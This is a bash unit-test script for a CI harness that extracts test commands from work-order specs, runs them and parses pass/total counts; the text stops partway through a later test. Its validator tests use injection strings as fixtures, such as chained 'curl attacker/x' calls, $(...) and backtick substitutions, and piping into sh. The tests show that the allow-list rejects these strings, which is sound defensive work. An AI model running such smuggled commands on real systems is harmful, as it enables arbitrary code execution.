#!/usr/bin/env bash
# run-stop-tests.sh -- unit tests for the run-stop-tests node core (rst_*) in
# .archon/workflows/defaults/bdc-feature-development-codex.yaml and its byte-identical
# mirrors in the other 12 bdc-feature-development lanes. Also covers the dprep core
# (dprep_ensure_js_deps) that appears twice per lane (prep-dependencies node +
# run-stop-tests embed) and the npx/npm -> bun fallback in rst_run_commands.
#
# bdc-xo #1940 (harness defect 2026-09-05): the manifest "Tests:" line was stamped
# "N/A (required gates are reported separately)" on CODE WOs and the validator's test
# claim was never tied to an executed command. run-stop-tests executes the spec's
# declared test command in the run worktree and emits OBSERVED pass/total.
#
# Rather than re-typing that logic (which would drift), these tests EXTRACT the real
# core functions from the canonical YAML (awk range-match on the BEGIN/END markers)
# and exercise them against fixtures. A parity test asserts the core is byte-identical
# across all 13 lanes (this repo has no shared-include mechanism for workflow YAMLs).
#
# Run: bash .archon/workflows/defaults/__tests__/run-stop-tests.sh
# Exits 0 on all-pass, 1 on any failure. ASCII only.

set -uo pipefail

FAIL=0
PASS=0

assert_eq() {
  local label="$1" expected="$2" actual="$3"
  if [ "$expected" = "$actual" ]; then
    PASS=$((PASS + 1)); echo "PASS: $label"
  else
    FAIL=$((FAIL + 1)); echo "FAIL: $label"; echo "  expected: [$expected]"; echo "  actual:   [$actual]"
  fi
}

assert_contains() {
  local label="$1" needle="$2" haystack="$3"
  if printf '%s\n' "$haystack" | grep -Fq "$needle"; then
    PASS=$((PASS + 1)); echo "PASS: $label"
  else
    FAIL=$((FAIL + 1)); echo "FAIL: $label"; echo "  needle:   $needle"; echo "  haystack: $haystack"
  fi
}

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DEFAULTS="$HERE/.."
CANONICAL_YAML="$DEFAULTS/bdc-feature-development-codex.yaml"
LANES="
bdc-feature-development-astra.yaml
bdc-feature-development-codex-only.yaml
bdc-feature-development-codex.yaml
bdc-feature-development-cursor.yaml
bdc-feature-development-fable.yaml
bdc-feature-development-fusion-cx-kimi.yaml
bdc-feature-development-fusion-cx-qwen.yaml
bdc-feature-development-grok.yaml
bdc-feature-development-kimi-k3.yaml
bdc-feature-development-zero-claude.yaml
bdc-feature-development-zero-open.yaml
bdc-feature-development-zero.yaml
bdc-feature-development.yaml
"

extract_core() {
  # extract_core <yaml> <marker>  -> the bash between "# ---- BEGIN <marker> core" and
  # "# ---- END <marker> core", de-indented by the 6-space block-scalar indent.
  tr -d '\r' < "$1" | awk -v m="$2" '
    index($0, "# ---- BEGIN " m " core") { c = 1; next }
    index($0, "# ---- END " m " core") { c = 0 }
    c
  ' | sed 's/^      //'
}

RST_CORE="$(extract_core "$CANONICAL_YAML" rst)"
if [ -z "$RST_CORE" ]; then
  echo "FATAL: could not extract rst core from $CANONICAL_YAML"; exit 1
fi
eval "$RST_CORE"
for fn in rst_class rst_extract_commands rst_command_looks_runnable rst_rescue_subdir rst_tests_in_diff rst_repo_test_script rst_parse_counts rst_scrub_env rst_run_commands rst_report; do
  if ! declare -F "$fn" >/dev/null; then echo "FATAL: $fn not defined after eval"; exit 1; fi
done

echo "--- Parity: rst core byte-identical across all 13 lanes ---"
for lane in $LANES; do
  assert_eq "parity $lane" "$RST_CORE" "$(extract_core "$DEFAULTS/$lane" rst)"
done

# Extract the Nth occurrence of a core. dprep appears twice per lane (the
# prep-dependencies node and the run-stop-tests embed), so extract_core (which
# concatenates every occurrence) cannot compare them individually.
extract_core_nth() {
  tr -d '\r' < "$1" | awk -v m="$2" -v want="$3" '
    index($0, "# ---- BEGIN " m " core") { seen++; active = (seen == want); next }
    index($0, "# ---- END " m " core") { if (active) active = 0; next }
    active { print }
  ' | sed 's/^      //'
}

DPREP_CORE="$(extract_core_nth "$CANONICAL_YAML" dprep 1)"
if [ -z "$DPREP_CORE" ]; then
  echo "FATAL: could not extract dprep core from $CANONICAL_YAML"; exit 1
fi
eval "$DPREP_CORE"
if ! declare -F dprep_ensure_js_deps >/dev/null; then echo "FATAL: dprep_ensure_js_deps not defined after eval"; exit 1; fi

echo "--- Parity: dprep core (2 per lane) byte-identical across all 13 lanes; implement depends_on prep-dependencies (Test 8) ---"
for lane in $LANES; do
  assert_eq "dprep occurrence count $lane" "2" "$(grep -c 'BEGIN dprep core' "$DEFAULTS/$lane")"
  assert_eq "dprep occ#1 $lane" "$DPREP_CORE" "$(extract_core_nth "$DEFAULTS/$lane" dprep 1)"
  assert_eq "dprep occ#2 $lane" "$DPREP_CORE" "$(extract_core_nth "$DEFAULTS/$lane" dprep 2)"
  assert_eq "implement depends_on [prep-dependencies] $lane" "1" "$(grep -c 'depends_on: \[prep-dependencies\]' "$DEFAULTS/$lane")"
  assert_eq "prep-dependencies node present $lane" "1" "$(grep -c '^  - id: prep-dependencies$' "$DEFAULTS/$lane")"
done

echo "--- rst_class ---"
SPEC_M157='# WO-SHOPOPS-M157-CGC-DEALER-API-01

WO Class: CODE
target_repo: thinmansoftware/shopops

## 8. Stop conditions (CI-executable)

Stop 1a (grep assertion, new provider):
  grep -c "cgc-dealer-api" shopops-api/services/cert-lookup.js
  Expected: 1

Stop 2 (test suite):
  cd shopops-api && node tests/test_cgc_dealer_api.js && node tests/run_all.js --suite=m157
  Expected: all passing / 0 failing

Stop 2b (full suite):
  cd shopops-api && node tests/run_all.js

Stop 3 (ASCII scan):
  LC_ALL=C grep -n "[^ -~]" shopops-api/services/cert-lookup.js
  Expected: no output

## 9. Manifest requirements (CODE class)

Tests: <n>/<n> (cd shopops-api && node tests/test_cgc_dealer_api.js) and <n>/<n> (node tests/run_all.js)
'
assert_eq "CODE from 'WO Class: CODE'" "CODE" "$(printf '%s\n' "$SPEC_M157" | rst_class)"
assert_eq "MIXED from 'WO Class: MIXED'" "MIXED" "$(printf 'x\nWO Class: MIXED\n' | rst_class)"
assert_eq "DOCUMENTATION from fenced 'Class: DOCUMENTATION'" "DOCUMENTATION" "$(printf '```\nClass: DOCUMENTATION\n```\n' | rst_class)"
assert_eq "DOCS alias" "DOCUMENTATION" "$(printf 'WO Class: DOCS\n' | rst_class)"
assert_eq "default CODE when no class line" "CODE" "$(printf '# WO-X\n\nRung classification: feature\n' | rst_class)"
assert_eq "'Rung classification:' is not a class line" "CODE" "$(printf 'Rung classification: INFRA\n' | rst_class)"

echo "--- rst_extract_command ---"
assert_eq "Stop 2 (test suite) command wins" \
  "cd shopops-api && node tests/test_cgc_dealer_api.js && node tests/run_all.js --suite=m157" \
  "$(printf '%s\n' "$SPEC_M157" | rst_extract_commands | head -1)"
assert_eq "grep stop with 'tests' in its label is not a test block" \
  "bun test packages/x" \
  "$(printf 'Stop 1 (grep assertion, no secret in tests/fixtures):\n  grep -c x y\n  Expected: 0\n\nStop 2 (tests):\n  bun test packages/x\n  Expected: 3 passing\n' | rst_extract_commands | head -1)"
assert_eq "backslash continuation joins" \
  "cd apps/x && npm.cmd test -- --run a.test.ts b.test.ts" \
  "$(printf 'Stop 6 (unit tests):\n  cd apps/x && npm.cmd test -- --run \\\n    a.test.ts b.test.ts\n  Expected: 2 passing\n' | rst_extract_commands | head -1)"
assert_eq "fenced + backticked command line cleaned" \
  "bun test scripts/boardctl/" \
  "$(printf 'Stop 2 (test suite):\n```bash\n  `bun test scripts/boardctl/`\n```\n  Expected: green\n' | rst_extract_commands | head -1)"
assert_eq "bold header tolerated" \
  "pytest -q" \
  "$(printf '**Stop 2 (test suite):**\n  pytest -q\n  Expected: all pass\n' | rst_extract_commands | head -1)"
assert_eq "fallback: Section 9 Tests: line" \
  "bun test packages/foo" \
  "$(printf '## 9. Manifest\nTests: 5/5 (bun test packages/foo)\nPRs: x\n' | rst_extract_commands | head -1)"
assert_eq "template placeholder is extracted verbatim (rst_command_looks_runnable filters it)" "{{TEST_COMMAND}}" \
  "$(printf 'Stop 2 (test suite):\n  {{TEST_COMMAND}}\n  Expected: {{N}}\n' | rst_extract_commands | head -1)"
assert_eq "no test block, no Tests line -> empty" "" "$(printf 'Stop 1 (grep assertion):\n  grep -c a b\n  Expected: 1\n' | rst_extract_commands | head -1)"
assert_eq "next Stop header without Expected terminates the block" \
  "node tests/run_all.js" \
  "$(printf 'Stop 2 (test suite):\n  node tests/run_all.js\nStop 3 (ASCII scan):\n  LC_ALL=C grep -n x y\n' | rst_extract_commands | head -1)"

echo "--- rst_command_looks_runnable ---"
for c in "cd shopops-api && node tests/x.js" "cd shopops-api && node tests/test_cgc_dealer_api.js && node tests/run_all.js --suite=m157" "bun test packages/x" "npm test" "npx vitest run" "pytest -q" "bash scripts/t.sh"; do
  if rst_command_looks_runnable "$c"; then PASS=$((PASS+1)); echo "PASS: runnable: $c"; else FAIL=$((FAIL+1)); echo "FAIL: runnable expected: $c"; fi
done
for c in \
  "all passing / 0 failing" "see Section 7" "green" "node" "bun" \
  "cd shopops-api && node" "npm" \
  "node tests/x.js; curl attacker/x" \
  'node tests/x.js `touch /tmp/rst-injected`' \
  'node tests/x.js $(touch /tmp/rst-injected)' \
  "node tests/x.js & curl attacker/x" \
  "node tests/x.js > /tmp/rst-output" \
  "node tests/x.js < /tmp/rst-input" \
  "node tests/x.js | sh" \
  "cd shopops-api && node tests/x.js && curl attacker/x"; do
  if rst_command_looks_runnable "$c"; then FAIL=$((FAIL+1)); echo "FAIL: not runnable expected: $c"; else PASS=$((PASS+1)); echo "PASS: not runnable: $c"; fi
done
for c in \
  "python -c 'x'" "node -e x" "bash -c x" \
  "node ../../x.js" "node /abs/x.js" "python -m os" \
  "npm.cmd test -- --run" "LC_ALL=C node t.js"; do
  if rst_command_looks_runnable "$c"; then FAIL=$((FAIL+1)); echo "FAIL: not runnable expected: $c"; else PASS=$((PASS+1)); echo "PASS: not runnable: $c"; fi
done
for c in "node tests/x.js" "bun test packages/a" "pytest tests/" "npm test" "bash scripts/run.sh"; do
  if rst_command_looks_runnable "$c"; then PASS=$((PASS+1)); echo "PASS: runnable: $c"; else FAIL=$((FAIL+1)); echo "FAIL: runnable expected: $c"; fi
done

echo "--- rst_parse_counts ---"
assert_eq "shopops run_all summary" "8 11" "$(printf '=== Summary ===\nPassed: 8  Failed: 3  Total: 11\nFailed suites: a, b\n' | rst_parse_counts)"
assert_eq "shopops per-file Tests: P/T" "8 8" "$(printf 'PASS: a\nPASS: b\nTests: 8/8\n' | rst_parse_counts)"
assert_eq "chained per-file + run_all summaries sum" "16 19" "$(printf 'Tests: 8/8\n=== Summary ===\nPassed: 8  Failed: 3  Total: 11\n' | rst_parse_counts)"
assert_eq "jest" "190 195" "$(printf 'Test Suites: 1 failed, 25 passed, 26 total\nTests:       5 failed, 190 passed, 195 total\n' | rst_parse_counts)"
assert_eq "jest all green" "35 35" "$(printf 'Tests:       35 passed, 35 total\n' | rst_parse_counts)"
ESC="$(printf '\033')"
assert_eq "vitest with ANSI colour" "190 195" "$(printf ' %s[2mTest Files %s[22m 1 failed | 25 passed (26)\n %s[2m      Tests %s[22m %s[31m5 failed%s[39m | %s[32m190 passed%s[39m %s[90m(195)%s[39m\n' "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" "$ESC" | rst_parse_counts)"
assert_eq "vitest all green with skipped" "35 37" "$(printf '      Tests  35 passed | 2 skipped (37)\n' | rst_parse_counts)"
assert_eq "bun test" "4 5" "$(printf ' 4 pass\n 1 fail\n 9 expect() calls\nRan 5 tests across 1 file.\n' | rst_parse_counts)"
assert_eq "node:test (non-ASCII info glyph)" "4 4" "$(printf '\342\204\271 tests 4\n\342\204\271 pass 4\n\342\204\271 fail 0\n' | rst_parse_counts)"
assert_eq "TAP" "3 4" "$(printf 'ok 1 - a\nnot ok 2 - b\n# tests 4\n# pass 3\n# fail 1\n' | rst_parse_counts)"
assert_eq "mocha" "12 13" "$(printf '  12 passing (1s)\n  1 failing\n' | rst_parse_counts)"
assert_eq "pytest" "10 12" "$(printf '=================== 2 failed, 10 passed in 0.42s ===================\n' | rst_parse_counts)"
assert_eq "fallback PASS:/FAIL: lines" "6 8" "$(printf 'PASS: one\nPASS: two\nFAIL: three: boom\nPASS: four\nPASS: five\nFAIL: six\nPASS: seven\nPASS: eight\n' | rst_parse_counts)"
assert_eq "no recognisable output -> empty" "" "$(printf 'building...\ndone\n' | rst_parse_counts)"

echo "--- rst_report ---"
assert_eq "passed" "$(printf 'TESTS_STATUS=passed\nTESTS_LINE=27/27 (bun test x)')" "$(rst_report CODE 'bun test x' 0 '27 27')"
assert_eq "nonzero exit is failed even when counts agree" "$(printf 'TESTS_STATUS=failed\nTESTS_LINE=8/8 (node t.js) -- FAILED, exit 1')" "$(rst_report CODE 'node t.js' 1 '8 8')"
assert_eq "passed < total is failed" "$(printf 'TESTS_STATUS=failed\nTESTS_LINE=6/8 (node t.js) -- FAILED, exit 0')" "$(rst_report CODE 'node t.js' 0 '6 8')"
assert_eq "zero tests ran is failed" "$(printf 'TESTS_STATUS=failed\nTESTS_LINE=0/0 (node t.js) -- FAILED, exit 0')" "$(rst_report CODE 'node t.js' 0 '0 0')"
assert_eq "timeout exit 124 is failed" "$(printf 'TESTS_STATUS=failed\nTESTS_LINE=3/3 (node t.js) -- FAILED, exit 124')" "$(rst_report CODE 'node t.js' 124 '3 3')"
assert_contains "counts_unparsed" "TESTS_STATUS=counts_unparsed" "$(rst_report CODE 'node t.js' 0 '')"
assert_contains "counts_unparsed line is N/A with the command" "TESTS_LINE=N/A (test command exited 0 but pass/total could not be parsed from its output: node t.js)" "$(rst_report CODE 'node t.js' 0 '')"
assert_contains "CODE with no command is no_command_declared" "TESTS_STATUS=no_command_declared" "$(rst_report CODE '' 0 '')"
assert_contains "MIXED with no command is no_command_declared" "TESTS_STATUS=no_command_declared" "$(rst_report MIXED '' 0 '')"
assert_contains "INFRA with no command is not_required" "TESTS_STATUS=not_required" "$(rst_report INFRA '' 0 '')"
assert_contains "INFRA no-command line" "TESTS_LINE=N/A (INFRA class, no test command declared)" "$(rst_report INFRA '' 0 '')"

echo "--- integration: extract -> execute -> parse -> report in a temp worktree ---"
TMP="$(mktemp -d)"
cat > "$TMP/fake-tests.sh" <<'EOF'
#!/usr/bin/env bash
echo "PASS: alpha"
echo "PASS: beta"
echo "PASS: gamma"
echo "Tests: 3/3"
exit 0
EOF
SPEC_TMP="$(printf 'WO Class: CODE\n\nStop 2 (test suite):\n  bash ./fake-tests.sh\n  Expected: 3 passing / 3 total\n')"
CMD="$(printf '%s\n' "$SPEC_TMP" | rst_extract_commands | head -1)"
assert_eq "integration: command extracted" "bash ./fake-tests.sh" "$CMD"
( cd "$TMP" && timeout 60 bash -o pipefail -c "$CMD" > "$TMP/log" 2>&1 ); RC=$?
COUNTS="$(rst_parse_counts < "$TMP/log")"
assert_eq "integration: counts parsed from real execution" "3 3" "$COUNTS"
assert_eq "integration: report" "$(printf 'TESTS_STATUS=passed\nTESTS_LINE=3/3 (bash ./fake-tests.sh)')" "$(rst_report "$(printf '%s\n' "$SPEC_TMP" | rst_class)" "$CMD" "$RC" "$COUNTS")"
cat > "$TMP/fake-tests.sh" <<'EOF'
#!/usr/bin/env bash
echo "PASS: alpha"
echo "FAIL: beta: expected 2 got 1"
echo "Tests: 1/2"
exit 1
EOF
( cd "$TMP" && timeout 60 bash -o pipefail -c "$CMD" > "$TMP/log" 2>&1 ); RC=$?
assert_eq "integration: red suite reports failed with real numbers" "$(printf 'TESTS_STATUS=failed\nTESTS_LINE=1/2 (bash ./fake-tests.sh) -- FAILED, exit 1')" "$(rst_report CODE "$CMD" "$RC" "$(rst_parse_counts < "$TMP/log")")"
rm -rf "$TMP"

echo "--- rst_extract_commands: real spec shapes on bdc-xo main (2026-09-05 survey) ---"
SPEC_GCD='# WO-SHOPOPS-GCD-METADATA-TO-LISTING-01

WO Class: CODE

## 9. Stop conditions (CI-executable)

- `node tests/test_cover_resolver.js` exits 0 if that suite exists; otherwise
  state N/A and add a new suite that does.
- A new suite exists and exits 0: `node tests/test_gcd_metadata_passthrough.js`
- `grep -c "gcd" shopops-api/routes/store.js` returns 1 or greater.
- These pre-existing suites still exit 0: `node tests/test_cert_lookup.js`,
  `node tests/test_scan_to_list_cgc.js`.
- ASCII check on every touched file: `grep -nP "[^\x00-\x7F]"` returns nothing.

## 10. Manifest requirements

Manifest v2 in the PR body per global Rule 2.
'
OUT="$(printf '%s\n' "$SPEC_GCD" | rst_extract_commands)"
assert_eq "bullet-style stop section: four runner commands in document order" \
  "$(printf 'node tests/test_cover_resolver.js\nnode tests/test_gcd_metadata_passthrough.js\nnode tests/test_cert_lookup.js\nnode tests/test_scan_to_list_cgc.js')" "$OUT"

SPEC_GWT='# WO-SHOPOPS-CE-AUTH-CONTEXT-01

WO Class: CODE

## 7. Test scenarios

Test: /admin audit line
Given: alpha token, header bravo
When: GET /admin/ce-session -> 403
Then: one console line

## 12. Stop Point

Test: focused suite green
Given: fresh checkout of the PR head, `cd shopops-api && npm ci`
When: `node tests/test_auth_tenant_context.js`
Then: exit 0, summary line `Passed: N  Failed: 0` with N >= 60

Test: runner wiring
When: `node tests/run_all.js --suite=test_auth_tenant_context`
Then: exit 0 and the suite is listed (1 suite)

Test: legacy structural suite still green
When: `node tests/test_auth0_direct.js`
Then: exit 0

Test: consumers no longer read the raw header first
When: `grep -c "req.headers" shopops-api/routes/admin.js`
Then: 0
'
OUT="$(printf '%s\n' "$SPEC_GWT" | rst_extract_commands)"
assert_eq "Given/When/Then Stop Point: the three runner commands, npm ci and grep excluded" \
  "$(printf 'cd shopops-api && npm ci\nnode tests/test_auth_tenant_context.js\nnode tests/run_all.js --suite=test_auth_tenant_context\nnode tests/test_auth0_direct.js')" "$OUT"
if rst_command_looks_runnable "cd shopops-api && npm ci"; then FAIL=$((FAIL+1)); echo "FAIL: npm ci must not be runnable"; else PASS=$((PASS+1)); echo "PASS: npm ci is filtered as an install step"; fi
if rst_command_looks_runnable "bun install --frozen-lockfile"; then FAIL=$((FAIL+1)); echo "FAIL: bun install must not be runnable"; else PASS=$((PASS+1)); echo "PASS: bun install is filtered as an install step"; fi
if rst_command_looks_runnable "{{TEST_COMMAND}}"; then FAIL=$((FAIL+1)); echo "FAIL: placeholder must not be runnable"; else PASS=$((PASS+1)); echo "PASS: template placeholder is filtered"; fi

SPEC_PROSE='# WO-HARNESS-AUTO-REREVIEW-REPEAT-REASON-01

WO Class: CODE

## Stop conditions
Baseline on untouched tree: scenario 1 FAILS.
1. Given PR head, greps show the reason builder and its call site.
2. Test command exits 0 with scenarios 1-8 asserting values.
3. Runtime (Rule 19, after container rebuild under M-09).

## 12. Stop Point
Stops 1-3 evidenced; status:review; Captain CI closes.
'
assert_eq "prose-only stop section declares no command" "" "$(printf '%s\n' "$SPEC_PROSE" | rst_extract_commands)"
assert_eq "template block first, Section 9 duplicate deduped" \
  "$(printf 'bun test packages/foo\nbun test packages/bar')" \
  "$(printf 'Stop 2 (test suite):\n  bun test packages/foo\n  Expected: 3 passing\n\n## Stop conditions\n- `bun test packages/bar` exits 0\n\nTests: 3/3 (bun test packages/foo)\n' | rst_extract_commands)"
assert_eq "cap at 8 commands" "8" "$(for i in 1 2 3 4 5 6 7 8 9 10; do printf -- '## Stop conditions\n- `node tests/t%s.js` exits 0\n' "$i"; done | rst_extract_commands | grep -c .)"

echo "--- rst_rescue_subdir ---"
TMP="$(mktemp -d)"
mkdir -p "$TMP/shopops-api/tests" "$TMP/docs" "$TMP/node_modules/x/tests"
printf 'x' > "$TMP/shopops-api/tests/test_x.js"
printf 'x' > "$TMP/node_modules/x/tests/test_x.js"
assert_eq "node tests/x.js rescued into the only depth-1 dir that has it" "cd shopops-api && node tests/test_x.js" "$(cd "$TMP" && rst_rescue_subdir 'node tests/test_x.js')"
assert_eq "already cd-prefixed command untouched" "cd shopops-api && node tests/test_x.js" "$(cd "$TMP" && rst_rescue_subdir 'cd shopops-api && node tests/test_x.js')"
assert_eq "path that exists at root untouched" "bun test shopops-api/tests/test_x.js" "$(cd "$TMP" && rst_rescue_subdir 'bun test shopops-api/tests/test_x.js')"
assert_eq "path found nowhere untouched" "node tests/nope.js" "$(cd "$TMP" && rst_rescue_subdir 'node tests/nope.js')"
mkdir -p "$TMP/other/tests" && printf 'x' > "$TMP/other/tests/test_x.js"
assert_eq "ambiguous (two candidate dirs) untouched" "node tests/test_x.js" "$(cd "$TMP" && rst_rescue_subdir 'node tests/test_x.js')"
rm -rf "$TMP"

echo "--- rst_tests_in_diff (temp git repo) ---"
TMP="$(mktemp -d)"
(
  cd "$TMP" && git init -q . && git config user.email t@t && git config user.name t
  mkdir -p src shopops-api/tests/fixtures shopops-api/tests/helpers packages/x/src tests/helpers
  printf 'base\n' > src/a.ts && printf '{}\n' > bun.lock && printf '{"name":"x"}\n' > package.json
  git add -A && git commit -qm base
  BASE="$(git rev-parse HEAD)"
  printf 'changed\n' > src/a.ts
  printf 't\n' > packages/x/src/a.test.ts
  printf 't\n' > shopops-api/tests/test_b.js
  printf '{}\n' > shopops-api/tests/fixtures/f.json
  printf 'h\n' > shopops-api/tests/helpers/h.js
  printf 'h\n' > tests/helpers/h.js
  printf 'r\n' > shopops-api/tests/run_all.js
  printf 'u\n' > shopops-api/tests/_harness.js
  printf 's\n' > tests/test_validate_prior_art_evidence.sh
  git add -A && git commit -qm change
  mkdir -p packages/y && printf 'u\n' > packages/y/z.spec.ts
  rst_tests_in_diff "$BASE" > "$TMP/out1"
  printf '{"name":"x","devDependencies":{"vitest":"^2"}}\n' > package.json
  rst_tests_in_diff "$BASE" > "$TMP/out2"
  git checkout -q -- . 2>/dev/null; rm -f packages/y/z.spec.ts
  rst_tests_in_diff HEAD > "$TMP/out3"
)
assert_eq "bun runner groups committed + untracked test files; bash test at root; fixtures/helpers/run_all/_harness/src excluded" \
  "$(printf 'cd shopops-api && node tests/test_b.js\nbash tests/test_validate_prior_art_evidence.sh\nbun test packages/x/src/a.test.ts packages/y/z.spec.ts')" "$(cat "$TMP/out1")"
assert_contains "vitest declared in package.json -> npx vitest run" "npx vitest run packages/x/src/a.test.ts packages/y/z.spec.ts" "$(cat "$TMP/out2")"
assert_eq "no test files in diff -> empty" "" "$(cat "$TMP/out3")"
rm -rf "$TMP"

echo "--- rst_repo_test_script (last rung) ---"
TMP="$(mktemp -d)"
assert_eq "no package.json -> empty" "" "$(cd "$TMP" && rst_repo_test_script)"
printf '{"name":"x","scripts":{"build":"tsc"}}\n' > "$TMP/package.json"
assert_eq "package.json without a test script -> empty" "" "$(cd "$TMP" && rst_repo_test_script)"
printf '{"name":"x","scripts":{"test":"vitest run"}}\n' > "$TMP/package.json"
assert_eq "test script, no bun lockfile -> npm test" "npm test" "$(cd "$TMP" && rst_repo_test_script)"
printf '{}\n' > "$TMP/bun.lock"
assert_eq "test script + bun.lock -> bun run test" "bun run test" "$(cd "$TMP" && rst_repo_test_script)"
rm -rf "$TMP"

echo "--- rst_run_commands: two commands, counts summed, first nonzero exit kept ---"
export OVERSEER_FOO=production-shaped-test-value
export MERGE_MANAGER_GH_TOKEN=production-shaped-test-value
export BOARD_PRINCIPALS_JSON=production-shaped-test-value
export GH_TOKEN=production-shaped-test-value
export DISPATCH_POSTGRES_PHASE15_TEST_URL=postgresql://localhost/phase15
rst_scrub_env
assert_eq "scrub removes OVERSEER_ prefix" "unset" "${OVERSEER_FOO:-unset}"
assert_eq "scrub removes MERGE_MANAGER_ prefix" "unset" "${MERGE_MANAGER_GH_TOKEN:-unset}"
assert_eq "scrub removes BOARD_ prefix" "unset" "${BOARD_PRINCIPALS_JSON:-unset}"
assert_eq "scrub removes exact GH_TOKEN" "unset" "${GH_TOKEN:-unset}"
assert_eq "scrub preserves disposable test fixtures" "postgresql://localhost/phase15" "${DISPATCH_POSTGRES_PHASE15_TEST_URL:-unset}"
TMP="$(mktemp -d)"
cat > "$TMP/ok.sh" <<'EOF'
#!/usr/bin/env bash
echo "Tests: 3/3"
EOF
cat > "$TMP/red.sh" <<'EOF'
#!/usr/bin/env bash
echo " 4 pass"
echo " 1 fail"
exit 1
EOF
printf 'bash ./ok.sh\nbash ./red.sh\n' > "$TMP/cmds"
assert_eq "exit 1, 7 passed of 8" "1 7 8" "$(cd "$TMP" && rst_run_commands ./cmds ./log)"
assert_contains "log carries per-command headers" "### run-stop-tests: bash ./red.sh" "$(cat "$TMP/log")"
assert_contains "log carries per-command exit" "### exit 1" "$(cat "$TMP/log")"
printf 'bash ./ok.sh\n' > "$TMP/cmds"
assert_eq "single green command" "0 3 3" "$(cd "$TMP" && rst_run_commands ./cmds ./log2)"
printf 'exit 0\n' > "$TMP/silent.sh"
printf 'bash ./silent.sh\n' > "$TMP/cmds"
assert_eq "no counts parsed -> exit only" "0  " "$(cd "$TMP" && rst_run_commands ./cmds ./log3)"
rm -rf "$TMP"

echo "--- dprep_ensure_js_deps (Tests 1-4) ---"
# Test 1: a bun worktree without node_modules gets the prep step
TMP="$(mktemp -d)"
mkdir -p "$TMP/bin" "$TMP/proj"
cat > "$TMP/bin/bun" <<EOF
#!/usr/bin/env bash
echo "\$*" > "$TMP/argv"
echo "\$(( \$(cat "$TMP/calls" 2>/dev/null || echo 0) + 1 ))" > "$TMP/calls"
mkdir -p node_modules
EOF
chmod +x "$TMP/bin/bun"
printf '{"name":"x"}\n' > "$TMP/proj/package.json"
printf '{}\n' > "$TMP/proj/bun.lock"
OUT1="$(cd "$TMP/proj" && export PATH="$TMP/bin:$PATH" && dprep_ensure_js_deps 2>&1)"; RC1=$?
assert_contains "Test1: installing log line" "dprep: installing JS dependencies (bun install --frozen-lockfile --ignore-scripts)" "$OUT1"
assert_eq "Test1: stub recorded exact argv (--ignore-scripts blocks lifecycle writes)" "install --frozen-lockfile --ignore-scripts" "$(cat "$TMP/argv")"
assert_eq "Test1: node_modules created" "yes" "$([ -d "$TMP/proj/node_modules" ] && echo yes || echo no)"
assert_eq "Test1: return 0" "0" "$RC1"

# Test 2: prep is idempotent and skips when not applicable; stub call count stays 1
mkdir -p "$TMP/proj2" "$TMP/proj3"
printf '{"name":"y"}\n' > "$TMP/proj2/package.json"
OUT1b="$(cd "$TMP/proj" && export PATH="$TMP/bin:$PATH" && dprep_ensure_js_deps 2>&1)"; RC1b=$?
OUT2="$(cd "$TMP/proj2" && export PATH="$TMP/bin:$PATH" && dprep_ensure_js_deps 2>&1)"; RC2=$?
OUT3="$(cd "$TMP/proj3" && export PATH="$TMP/bin:$PATH" && dprep_ensure_js_deps 2>&1)"; RC3=$?
assert_contains "Test2: node_modules present skip" "dprep: node_modules present, skipping" "$OUT1b"
assert_contains "Test2: proj2 (package.json, no lockfile) skip" "dprep: no package.json with a bun lockfile, skipping" "$OUT2"
assert_contains "Test2: proj3 (neither) skip" "dprep: no package.json with a bun lockfile, skipping" "$OUT3"
assert_eq "Test2: stub call count stays 1" "1" "$(cat "$TMP/calls")"
assert_eq "Test2: all return 0" "0 0 0" "$RC1b $RC2 $RC3"
rm -rf "$TMP"

# Test 3: missing bun skips cleanly
TMP="$(mktemp -d)"
mkdir -p "$TMP/proj" "$TMP/emptybin"
printf '{"name":"x"}\n' > "$TMP/proj/package.json"
printf '{}\n' > "$TMP/proj/bun.lock"
OUT="$(cd "$TMP/proj" && export PATH="$TMP/emptybin" && dprep_ensure_js_deps 2>&1)"; RC=$?
assert_contains "Test3: bun not found skip" "dprep: bun not found, skipping" "$OUT"
assert_eq "Test3: return 0" "0" "$RC"
rm -rf "$TMP"

# Test 4: a failed install never fails the run and leaves tracked files untouched
TMP="$(mktemp -d)"
mkdir -p "$TMP/bin"
cat > "$TMP/bin/bun" <<'EOF'
#!/usr/bin/env bash
exit 1
EOF
chmod +x "$TMP/bin/bun"
(
  cd "$TMP" && git init -q . && git config user.email t@t && git config user.name t
  printf '{"name":"x"}\n' > package.json && printf '{}\n' > bun.lock
  git add -A && git commit -qm base
)
OUT="$(cd "$TMP" && export PATH="$TMP/bin:$PATH" && dprep_ensure_js_deps 2>&1)"; RC=$?
assert_contains "Test4: install failed message" "dprep: install failed rc=1 (continuing" "$OUT"
assert_eq "Test4: return 0 on failed install" "0" "$RC"
assert_eq "Test4: tracked files untouched" "" "$(cd "$TMP" && git status --porcelain --untracked-files=no)"
rm -rf "$TMP"

echo "--- rst_run_commands: npx->bunx / npm->bun translation + allowlist (Tests 5-7) ---"
# Test 5: npx becomes bunx when npx is absent, and counts are real
TMP="$(mktemp -d)"
mkdir -p "$TMP/bin"
cat > "$TMP/bin/bunx" <<EOF
#!/usr/bin/env bash
echo "\$*" > "$TMP/bunx-argv"
echo "      Tests  3 passed (3)"
EOF
chmod +x "$TMP/bin/bunx"
printf 'npx vitest run x.test.ts\n' > "$TMP/cmds"
RESULT="$(cd "$TMP" && export PATH="$TMP/bin:$PATH" RST_NPX_BIN=npx-absent-xyz && rst_run_commands ./cmds ./log)"
assert_eq "Test5: rst_run_commands prints 0 3 3" "0 3 3" "$RESULT"
assert_eq "Test5: bunx stub recorded rest of argv" "vitest run x.test.ts" "$(cat "$TMP/bunx-argv")"
assert_contains "Test5: translation line logged" "rst_run_commands: npx not found, running as: bunx vitest run x.test.ts" "$(cat "$TMP/log")"
assert_eq "Test5: report passed, declared command text kept" \
  "$(printf 'TESTS_STATUS=passed\nTESTS_LINE=3/3 (npx vitest run x.test.ts)')" \
  "$(SOURCE=spec_declared rst_report CODE 'npx vitest run x.test.ts' 0 '3 3')"
rm -rf "$TMP"

# Test 5b: npx falls back to `bun x` when BOTH npx and bunx are absent (bun-only
# containers may ship bun without the bunx shim). Build a PATH that keeps coreutils
# but provides neither npx nor bunx -- only our bun stub -- so the elif branch runs.
TMP="$(mktemp -d)"
mkdir -p "$TMP/bin"
cat > "$TMP/bin/bun" <<EOF
#!/usr/bin/env bash
echo "\$*" > "$TMP/bun-x-argv"
